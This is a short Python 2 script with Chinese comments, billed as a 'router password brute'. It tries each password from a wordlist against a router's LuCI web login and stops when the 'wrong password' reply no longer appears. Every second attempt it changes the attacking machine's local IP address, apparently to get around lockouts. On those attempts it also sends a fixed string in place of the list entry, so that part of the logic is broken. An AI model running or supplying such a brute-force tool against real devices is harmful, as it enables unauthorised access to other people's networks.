#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
router password brute
author:fengchao
time:2021/9/14
在linux中使用
注意open() 不用readlines 读取后列表中包括了\r\n
    用read()读取后slpitlines()分割
liunx中先要改一下网关设置
/etc/netword/interfaces加入
    auto eth0
    iface eth0 inet dhcp
linux编码问题：
    import sys
    reload(sys)
    sys.setdefaultencoding('utf-8')
"""
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import os
import requests
from time import sleep


# change linux ip
def change_ip(ip_list):
    for ip_last in ip_list:
        cmd = 'ifconfig eth0 192.168.1.' + str(ip_last)
        a = os.popen(cmd)
        print(cmd)
        ip_list.remove(ip_last)
        break


# password_book
def read_file():
    file = "/home/kali/password.txt"
    with open(file) as f:
        return f.read().splitlines()

def request_router(pwd):
    url = "http://192.168.1.1/cgi-bin/luci"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/93.0.4577.63Safari/537.36"
    }
    data = {
        "username": "useradmin",
        "psd": pwd
    }
    req = requests.post(url, headers=headers, data=data, timeout=2)
    sleep(3)
    print("测试密码》》》"+pwd)
    print(req.text)
    if "密码错误" in req.text:
        print(">>>>>>>>密码不对")
    else:
        print("密码正确<<<<<<<,退出脚本")
        exit()


psd_list = read_file()
ip_list = [110,109,125,137,154,106,187,190]
for i in range(0, len(psd_list)):
    psd = psd_list[i]
    if i % 2 == 0:
        print("改变IP")
        change_ip(ip_list)
        sd = 'vmjwm'
        request_router(sd)
    else:
        request_router(psd)
